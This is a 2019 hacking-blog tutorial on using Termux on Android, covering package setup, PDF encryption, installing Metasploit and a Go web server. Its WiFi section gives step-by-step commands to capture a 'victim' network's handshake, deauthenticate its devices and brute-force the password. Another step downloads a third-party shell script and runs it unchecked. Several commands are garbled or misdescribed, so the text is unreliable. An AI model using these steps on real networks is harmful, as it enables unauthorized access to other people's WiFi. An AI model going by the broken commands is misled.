---
title: 'Termux Hacks Guide [2019]: Tutorial, Lista de comandos, Ferramentas,
Apk, Usos, Pacotes'
date: 2019-09-25T18:15:00+01:00
draft: false
---

  

207787

[![Termux Hacks Guide [2018] : Tutorial, Commands List, Tools, Apk, Uses, Packages](https://www.hackeroyale.com/wp-content/uploads/2018/07/Untitled-Design-7.jpg "termux")](https://www.hackeroyale.com/wp-content/uploads/2018/07/Untitled-Design-7.jpg)

If you think Ethical Hacking is only restricted to use of Desktops or Laptops for that matter, think again because if you have observed the way I did, third party developers have been playing a huge role in filling gaps during each stage of Technological Evolution. In this guide we will learn about various Termux hacks, termux tutorials, termux wifi hack commands list, termux guide, termux tools, apk & packages & termux uses.

A similar Third Party developer called “Anonymous” has developed a Linux-self contained App called “Termux” which is used to install Linux based apps in Android and helps in running pure Linux apps in Android.

Now you will be wondering why do I need LINUX apps?

LINUX has a history of being a programmer centric so the purpose of TERMUX app is to help Cyber Security professionals in monitoring systems and Cyber Security practices like Penetration Testing through Mobile Networks.

You may also like: [How To Hack Website Using Android Without Root (SQLMAP Tutorial)](https://www.hackeroyale.com/sqlmap-on-android-nonrooted-tutorial/)

Compared to the millions of apps in Google Play Store, which in Mr. Peters words are considered “ports” of Linux applications which are made in an Android way, TERMUX is a pure LINUX app having a platform independent architecture making it portable and compatible with even Windows.

Before we continue, a simple line explanation on its UI: its UI is command line interface based.

Think MS-DOS and all those computers of yesteryears which came before Windows and MacOS and you will know what I am talking about. No shiny icons or instructions. Just you and your skills.

Contents  [hide](https://www.hackeroyale.com/termux-hacks-guide/#) 

[1. Termux hacks : 2019](https://www.hackeroyale.com/termux-hacks-guide/#Termux_hacks_2019)

[1.1. Termux Tools](https://www.hackeroyale.com/termux-hacks-guide/#Termux_Tools)

[1.2. Termux Guide](https://www.hackeroyale.com/termux-hacks-guide/#Termux_Guide)

[1.3. How To Hack Using Termux ?](https://www.hackeroyale.com/termux-hacks-guide/#How_To_Hack_Using_Termux)

[1.4. #1. How to encrypt, decrypt PDF files using TERMUX](https://www.hackeroyale.com/termux-hacks-guide/#1_How_to_encrypt_decrypt_PDF_files_using_TERMUX)

[1.4.1. #1.1. How to decrypt files](https://www.hackeroyale.com/termux-hacks-guide/#11_How_to_decrypt_files)

[1.4.2. #2. Install Metasploit Using Termux](https://www.hackeroyale.com/termux-hacks-guide/#2_Install_Metasploit_Using_Termux)

[1.4.3. #3. How To Hack Wifi Using Termux \[Termux WiFi hack commands list\]](https://www.hackeroyale.com/termux-hacks-guide/#3_How_To_Hack_Wifi_Using_Termux_Termux_WiFi_hack_commands_list)

[1.4.4. #4. Turn Android Device into a Web Server](https://www.hackeroyale.com/termux-hacks-guide/#4_Turn_Android_Device_into_a_Web_Server)

[1.5. Conclusion](https://www.hackeroyale.com/termux-hacks-guide/#Conclusion)

Termux hacks : 2019
===================

TERMUX apps like _HYDRA _and _NMAP _are easy to use and install. They are also platform independent and their Android versions are also identical to their LINUX versions.

TERMUX’s uniqueness lies in its non-rooting installation facility. Rooting means having privileged facility over applications installed.

This feature makes it easy for users to install complex software like NMAP and HYDRA.

Termux Tools
------------

NMAP is an open source Network mapper written by Gordon Lyon (also known as Fyodor Vaskovich). As the above suggests, its purpose is to scan for hosts and networks in a particular area through sending specially crafted data packets and analysing their responses. In the hands of Cyber Security experts, it is considered as an effective tool of Network Audit, performing Security Scans and for conducting other similar Network Security Activities.

‘NMAP’ can be installed in TERMUX by typing the following: “pkg install nmap”. The installation is fast and swift. After that you can use ‘NMAP’ by typing out its name in the terminal.

HYDRA is another command line based computer program capable of performing dictionary attacks on exposed protocols and networks.

Termux Guide
------------

Termux is available on Google PlayStore and F-Droid. Its free download and easy to use. One must also download its plugins which help the app interface with Android API.

Pro Tip :

Also download Hacker Keyboard which has CTRL and ESC buttons in it. You’ll be needing it while working in the app. Better get it from F-Droid.

Also read: [Top Best Hacking Tools For Linux, Windows And Mac OS X In 2018](https://www.hackeroyale.com/top-best-hacking-tools-linux-windows-mac/)

Let’s set it up now that we have downloaded the app. Since it’s a command line app like DOS, you have to rely on your memorising skills to master the app. Type the command: “pkg upgrade” to update all the built in packages then run “touch.hushlogin”_. _This helps unlock all the packages which you will require for your work.

For Example, a certain Mr. Konrad had after downloading the app acquired the following packages: Python, Ruby, NodeJS, GO and C Programming through the following magical code:

```
pkg install python cmakenodejs ruby golang
```

Moving on to setting workspace. TERMUX provides the following as default save location for all your files:

```
/data/data/com.termux/files/home 
```

But you can also change location by using the following example code:

```
mkdir notes gh homework temp
```

Next is configuring the dotfiles. Following is an example:

```
cd gh && git clone https://github.com/konradit/dotfiles.git && cp dotfiles/bashrc ~/.bashrc
```

Now install the basic packages using the following example and then Type exit to exit and enter the terminal again. The code is:

```
pkg install coreutilstermux-apitermux-exec termux-tools grep tree ncurses-utilsopensshgpg
```

Now you got a wicked terminal. Shorthand commands are:

n: cd $HOME/notes  
nn: cd $HOME/notes && vim  
t: cd $HOME/temp  
gh: cd $HOME/gh  
hh: cd $HOME/homework

Additionally you can just type the name of the directory and cd to it.If you want to have tmux run automatically when you enter the shell:

```
echo “tmux” >> ~/.bashrc
```

Pro tip: long press to copy/paste, change color scheme and change font!

#### Get Termux Ultimate Cheat Sheet for FREE!

Termux learning made easy! Get the Ultimate TERMUX CHEAT SHEET & WIFI COMMANDS in your inbox. 

Send me!

![](https://track.mailerlite.com/webforms/o/1502400/d8l0r9?vd890ed88b3a28c805acc70e1a88fa27c)

The uses of TERMUX are limitless. There are people who host servers using it, some download youtube videos using it as sort of incognito mode methods plus there are also you-know “research” stuff done by certain individuals.

Also read: [Top 5 Best Game Hacker Apps For Android Game Hacker with/without Root 2018](https://www.hackeroyale.com/top-best-game-hacker-apps-root-2018/)

Given it’s a software, its list of useful commands are also limitless. Below is a list of sample commands provided by my friends used in TERMUX acquired by me due to sheer lack of proper resource material available for this paper. Here are the codes with their descriptions:

pip install youtube-dl

For installing Youtube-dl

Packages install python

Installs Python

termux-setup-storage

Gives TERMUX access to your file system

mkdir ‘dir-name

For creating directory

cd “dir-name”

For changing directory

cat “file-name”

For reading any file

mv /path/file  /path where file is moved

For moving files from one path to another.

cp  /path/file  /path where to copy file

For copying files from one path to other

rm filename.file-extension

For removing mentioned file from a certain directory.

ping “website URL”

Helps verify IP level connectivity

toilet -f mono12 -F gay “your text”

Presents text in a specified format.

apt show (app-name)

Gives a short but detailed summary on mentioned name of desired app.

apt show (app-name)

Installs the desired app

How To Hack Using Termux ?
--------------------------

#1. How to encrypt, decrypt PDF files using TERMUX
--------------------------------------------------

Following is the list of “ingredients” required for preparing this combo:

1.  Termux : [Download Link](https://d-02.winudf.com/b/apk/Y29tLnRlcm11eF81OF83ZmI3ZDI5Ng?_fn=VGVybXV4X3YwLjU4X2Fwa3B1cmUuY29tLmFwaw&_p=Y29tLnRlcm11eA&as=c794cbd0d7b9480141d241a9399712425a5fa299&c=1%7CTOOLS&k=4fdf7f48568a8311742de6224941cb185a634493)
2.  PDF Unlocker: [Download Link](https://d-05.winudf.com/b/apk/Y29tLmNidXp6YXBwcy5wZGZ1bmxvY2tlcm1hc3Rlcl8xX2Y0OWExMDcy?_fn=UERGIFBhc3N3b3JkIFVubG9ja2VyIExvY2sgVW5sb2NrIFBERl92MS4wX2Fwa3B1cmUuY29tLmFwaw&_p=Y29tLmNidXp6YXBwcy5wZGZ1bmxvY2tlcm1hc3Rlcg&as=ded856575890fedcbcbc1ec37a7d6dfa5a753208&c=1%7CTOOLS&k=58607254a02f1c85b65759aa04a431245a7850cd)
3.  GitHub Link: [https://github.com/jesparza/peepdf.git](https://github.com/jesparza/peepdf.git)

Step #1: Run TERMUX, execute the following code and Press Enter. The code is:

“pkg update &&pkg upgrade &&pkg install python2 &&pkg install git”

The Result? The mentioned packages are installed in your system.

Step#2: Type the following code and press ENTER. The code is:“cd peepdf”.

Step #3: Now type command chmod +x peepdf.py and Press Enter

Step #4: Type command python2 peepdf.py -i and press Enter.

The steps above help in installation of PDF Unlocker in system.

Now we come to the Encryption part.

Step#1: After opening the PDF, type command encrypt Yourpassword Here “YourPassword” is Password for PDF file to open.

Step#2: then type command “save” and press Enter which makes your PDF Password Protected – a note pops up on your screen describing the same.

#### #1.1. How to decrypt files

Step#1: Open the file again by command open -f /sdcard/FileName.pdfand press Enter.

Step#2: Then type command decrypt YourPassword and press Enter. Password must be the same as set to encrypt the same PDF. In case of problem, PDF Unlocker is always there to help you out.

### #2. Install Metasploit Using Termux

The Metasploit Project is a computer security project that provides information about security vulnerabilities and aids in penetration testing and IDS signature development.

Following are the steps you need to follow to install Metasploit:  

#1: Install Termux from Google Play-Store  

#2: Open And Wait it for its Installation process.  

#3: Now type this Command

```
apt update  

```

#4: After updating completed type this command

```
apt install curl   

```

#5: Now Type

```
"cd $HOME"  

```

#6: Now type/copy this command

```
curl -LO https://raw.githubusercontent.com/Techzindia/Metasploit\_For\_Termux/master/metasploitTechzindia.sh  

```

#7: After above file is downloaded, type

```
ls
```

#8: You’ll see a .sh file. Now type this command

```
chmod +x metasploitTechzindia.sh  

```

#9: Now Run A Script By Type Command

```
sh metasploitTechzindia.sh
```

You’ll see a process is started. So wait until it ends.

\[Warning\]: Don’t turn off your data connection or wifi connection.  

#10: Now type,

```
ls
```

You’ll be seeing a metasploit-framework Folder.  

#11: Open a folder by typing in

```
cd   

```

#12: type “ls” command, you’ll see a list of files & folders.  

#13: Now Type “./msfconsole” to run Metasploit.

You may like to read: 

[Hack Any Android Over Internet Using Metasploit Part : 1](https://www.hackeroyale.com/hack-android-using-metasploit/)

[How To Hack Windows And Get Admin Access Using Metasploit ?](https://www.hackeroyale.com/hack-windows-get-admin-access/)

### #3. How To Hack Wifi Using Termux \[Termux WiFi hack commands list\]

There is one software called “aircrack-ng” which you need to first download using Google’s help. Then follow the steps given below:

First connect your wife-adapter to your device :

1) Friends first open Your Gnu Root Debian terminal or root terminal and start the monitor mode by typing these commands :

```
airmon-ng  
  
airmon-ng start wlan0
```

2) Now start the network detecting by typing this command :

```
airodump-ng wlan0mon
```

Here you see your target device and stop the detecting by control + z.

#### Get Termux Ultimate Cheat Sheet for FREE!

Termux learning made easy! Get the Ultimate TERMUX CHEAT SHEET & WIFI COMMANDS in your inbox. 

Send me!

![](https://track.mailerlite.com/webforms/o/1502400/d8l0r9?vd890ed88b3a28c805acc70e1a88fa27c)

3) Now create one folder and name it cap on your desktop or sd card and also create a password list to brute force the WiFi handshake ,collect the information about victim and create the password list for brute force.

4) Copy victim’s BSSID and also note the target channel CH number and type this command :

```
airodump-ng -c 6 --bssid00:26:44:AB:C5:C0 -w /root/Desktop/cap/ wlan0mon-w
```

There you must give the cap folder path if your created this cap folder on sdcard then you can give this path : \-w /sdcard/cap/ wlan0mon

5) Now open another terminal and disconnect all devices with this command and capture a wifi handshake type same command but use here target bssid :

```
aireeplay-ng -0 5 -a 00:26:44:AB:C5:C0 -wlan0mon
```

now stop attack by control+z and close the terminal

6) now paste the password list in your cap folder and also go into the cap folder directory

Now crack with this command :

```
aircrack-ng -w pass.list 01.cap
```

7) this is a brute force attack if any password match to the handshake then it will be cracked.and you get the key (means passwords)

You may like to read: [How To Hack WiFi Password On Android with/Without Root? : 2018](https://www.hackeroyale.com/hack-wifi-password/)

### #4. Turn Android Device into a Web Server

First of all I have to say that this experimental is tested and worked only with the [Iris web framework](http://iris-go.com/), written in [Golang](https://golang.org/) and Android version 5.1.

Following are the steps:

#1:Install & open [termux](https://play.google.com/store/apps/details?id=com.termux)

#2:Execute the following commands by order

```
$ pkg install git  
$ pkg install golang  
$ export GOPATH=/data/data/com.termux/files/home/go  
$ go get -u -v github.com/kataras/iris  
$ cd /data/data/com.termux/files/home/go/src/github.com/kataras/iris/\_examples/hello-world  
$ go run main.go
```

#3: Open your favorite browser and navigate to http://localhost:8080

Conclusion
----------

Lastly, I would like to conclude that TERMUX is one of the few apps whose overall utility is limitless. My experience tells me that when one doesn’t have a proper reference to fall back upon, the only way to learn then becomes through experimentation.

It is experimentation that helps one learn more about what he uses than through books. That is why I would suggest my readers to experiment with TERMUX to learn more about its uses.

A great person had once said: “With great power comes great responsibility”. Maintaining peace in Society is our responsibility. That’s why when you use apps like TERMUX do it for educational purposes and not for causing harm to anyone. Even before you think about committing such acts, spare a thought for your parents.

Technology is amazing and will continue to be amazing till time immemorial.

#### Get Termux Ultimate Cheat Sheet for FREE!

Termux learning made easy! Get the Ultimate TERMUX CHEAT SHEET & WIFI COMMANDS in your inbox. 

Send me!

![](https://track.mailerlite.com/webforms/o/1502400/d8l0r9?vd890ed88b3a28c805acc70e1a88fa27c)

Share

[

Facebook

](https://www.facebook.com/sharer.php?u=https%3A%2F%2Fwww.hackeroyale.com%2Ftermux-hacks-guide%2F)[

Twitter

](https://twitter.com/intent/tweet?text=Termux+Hacks+Guide+%5B2019%5D+%3A+Tutorial%2C+Commands+List%2C+Tools%2C+Apk%2C+Uses%2C+Packages&url=https%3A%2F%2Fwww.hackeroyale.com%2Ftermux-hacks-guide%2F&via=hackeroyale)[

Linkedin

](https://www.linkedin.com/shareArticle?mini=true&url=https://www.hackeroyale.com/termux-hacks-guide/&title=Termux%20Hacks%20Guide%20[2019]%20:%20Tutorial,%20Commands%20List,%20Tools,%20Apk,%20Uses,%20Packages)[

Email

](mailto:?subject=Termux%20Hacks%20Guide%20[2019]%20:%20Tutorial,%20Commands%20List,%20Tools,%20Apk,%20Uses,%20Packages&body=https://www.hackeroyale.com/termux-hacks-guide/)

Previous article[How To Hack An iPhone Free Without Jailbreak 2019 \[iPhone hacks & tricks\]](https://www.hackeroyale.com/iphone-hacks-jailbreak/)

Next article[PUBG Mobile Hack, aimbot, wallhack and other cheat codes \[2019\]](https://www.hackeroyale.com/pubg-mobile-hack/)

[![](https://secure.gravatar.com/avatar/0ef6700d847ecd495d2f3f1cc627b5eb?s=96&d=wp_user_avatar&r=g)](https://www.hackeroyale.com/author/anuj-mishra/)

[Anuj Mishra](https://www.hackeroyale.com/author/anuj-mishra/)

☆ TOP 50 Hacker Blogger ☆ Author ▪︎ SEO ▪︎ Writer ▪︎ Speaker